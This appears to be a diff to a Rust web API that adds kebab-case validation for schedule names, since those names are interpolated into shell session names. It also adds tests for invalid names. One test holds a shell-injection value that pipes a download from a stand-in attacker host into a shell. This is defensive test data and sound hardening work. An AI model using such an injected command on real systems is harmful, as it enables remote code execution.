@@ -71,6 +71,22 @@ pub async fn create(
     State(state): State<Arc<AppState>>,
     Json(req): Json<CreateScheduleRequest>,
 ) -> Result<(StatusCode, Json<Schedule>), ApiError> {
+    // Validate name: schedule names become session name prefixes (e.g. "nightly-20260331-0300"),
+    // so they must be safe for shell interpolation — same rules as session names.
+    if req.name.is_empty()
+        || req.name.len() > 128
+        || !req
+            .name
+            .bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+        || req.name.starts_with('-')
+        || req.name.ends_with('-')
+    {
+        return Err(bad_request(
+            "schedule name must be kebab-case (lowercase letters, digits, hyphens; no leading/trailing hyphens)",
+        ));
+    }
+
     // Validate cron
     scheduler::validate_cron(&req.cron).map_err(|e| bad_request(&e))?;
 
@@ -302,6 +318,38 @@ mod tests {
             .json(&serde_json::json!({
                 "name": "bad-cron",
                 "cron": "not valid",
+                "command": "echo",
+                "workdir": "/tmp"
+            }))
+            .await;
+        resp.assert_status(StatusCode::BAD_REQUEST);
+    }
+
+    #[tokio::test]
+    async fn test_create_schedule_invalid_name() {
+        let server = test_server().await;
+        let resp = server
+            .post("/api/v1/schedules")
+            .json(&serde_json::json!({
+                "name": "bad name!",
+                "cron": "0 3 * * *",
+                "command": "echo",
+                "workdir": "/tmp"
+            }))
+            .await;
+        resp.assert_status(StatusCode::BAD_REQUEST);
+        let body = resp.text();
+        assert!(body.contains("kebab-case"));
+    }
+
+    #[tokio::test]
+    async fn test_create_schedule_shell_injection_name() {
+        let server = test_server().await;
+        let resp = server
+            .post("/api/v1/schedules")
+            .json(&serde_json::json!({
+                "name": "x'; curl evil.com | sh; echo '",
+                "cron": "0 3 * * *",
                 "command": "echo",
                 "workdir": "/tmp"
             }))
